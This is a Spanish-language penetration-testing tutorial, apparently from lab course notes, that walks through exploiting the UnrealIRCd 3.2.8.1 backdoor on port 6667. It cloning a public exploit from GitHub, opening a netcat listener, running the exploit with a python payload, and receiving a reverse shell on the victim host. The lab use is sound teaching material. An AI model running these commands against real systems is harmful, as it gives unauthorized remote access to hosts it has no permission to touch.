# Explotacion manual de vulnerabilidades Host

Lo que vamos hacer aqui es explotar vulnerabilidades de forma manual, sin utilizar herramientas automatizadas como por ejemplo `metasploit` si no que vamos a investigar herramientas que puedan explotar estas vulnerabilidades de forma manual.

Vamos a empezar mirando el reporte que obtuvimos de `nmap` anteriormente y en concreto vamos a intentar explotar la vulnerabilidad que nos marca del puerto `6667` que se utiliza para comunicarse con otras personas como si fuera un `chat` pero en este caso esta `troyanizada` y para obtener mas informacion nos muestra el link.

<figure><img src="../../../.gitbook/assets/image (46) (1).png" alt=""><figcaption></figcaption></figure>

URL = [Pagina de referencia](http://seclists.org/fulldisclosure/2010/Jun/277)

<figure><img src="../../../.gitbook/assets/image (47) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que vemos nos explica que esa version de aplicacion, contiene una `backdoor` (Puerta trasera) por lo que podemos aprovechar eso para obtener acceso a la maquina.

Si investigamos mas sobre esa vulnerabilidad `UnrealIRCd 3.2.8.1`, buscando un exploit del mismo, podremos encontrar un repositorio en `GitHub` sobre esto.

URL = [Exploit UnrealIRCd 3.2.8.1 GitHub](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor)

Nos descargaremos el repositorio de la siguiente forma:

```shell
git clone https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor.git
cd UnrealIRCd-3.2.8.1-Backdoor/
```

Si investigamos mas a fondo como funciona el codigo por dentro, haciendo lo siguiente:

```shell
nano exploit.py
```

Podremos ver el codigo por dentro, vemos que nos va a pedir una serie de parametros para poder utilziarlos en el exploit, tambien vemos que realiza una consexion utilizando una serie de sockets con lo que le hayamos indicado para que asi pueda crear ese `backdoor`.

> ¿Que es un `exploit`?

Un `exploit` normalmente es una porcion de codigo fuente que puede estar escrita en practicamente cualquier lenguaje de programacion (`Python, C++, etc...`), lo que va hacer es tratar de aprovechar una vulnerabilidad y ofrecernos un beneficio (Conexion reversa a dicha maquina, dumpeo de informacion de credenciales, escalada de privilegios, etc...).

> ¿Que es un `payload`?

El `payload` es concretamente lo que se va a ejecutar el codigo que nosotros vamos a injectar una vez que ya hemos aprovechado ese fallo de seguridad para realizar la accion que nos interese.

Antes de ejecutarlo tendremos que poner nuestra IP y el puerto que queramos dentro del exploit:

<figure><img src="../../../.gitbook/assets/image (48) (1).png" alt=""><figcaption></figcaption></figure>

Una vez echo esto lo guardamos y ahora si lo iriamos a ejecutar.

Por lo que podremos ejeuctar el exploit de la siguiente forma:

Primero estaremos a la escucha desde el puerto que le hayamos indicado antes en el script del exploit.

```shell
nc -lvnp <PORT>
```

Despues estando a la escucha, ejecutaremos el `exploit` para que nos de la shell a la escucha en la que estamos.

```shell
sudo chmod 777 exploit.py
./exploit.py 192.168.16.133 6667 -payload python
```

Info:

```
Exploit sent successfully!
```

Y en la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.16.128] from (UNKNOWN) [192.168.16.133] 35988
boba_fett@ubuntu:/opt/unrealircd/Unreal3.2$ whoami
whoami
boba_fett
boba_fett@ubuntu:/opt/unrealircd/Unreal3.2$ 
```

Por lo que vemos funciono todo correctamente y ya habremos obtenido una shell con la maquina victima `Linux`.
